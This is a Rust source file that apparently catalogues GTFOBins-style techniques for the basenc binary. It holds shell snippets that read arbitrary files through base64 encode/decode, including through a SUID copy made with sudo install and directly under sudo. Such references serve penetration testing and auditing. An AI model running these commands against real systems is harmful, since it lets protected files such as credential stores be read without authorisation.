
pub static BIN_NAME: &'static str = "basenc";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    basenc --base64 $LFILE | basenc -d --base64
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which basenc) .

    LFILE=file_to_read
    basenc --base64 $LFILE | basenc -d --base64
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo basenc --base64 $LFILE | basenc -d --base64
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
